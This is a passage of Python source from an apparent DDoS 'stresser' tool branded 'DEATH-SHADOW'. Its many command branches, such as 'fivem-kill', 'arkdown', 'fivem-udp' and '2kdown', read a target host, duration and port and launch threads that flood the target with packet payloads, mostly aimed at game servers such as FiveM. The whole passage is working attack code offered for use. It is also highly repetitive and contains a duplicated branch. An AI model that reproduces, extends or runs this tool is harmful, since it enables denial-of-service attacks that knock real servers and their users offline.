					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arklift":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arkdown":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-down":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-rape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv1":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv2":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-slump":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-guard":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-arkdown":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "2kdown":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
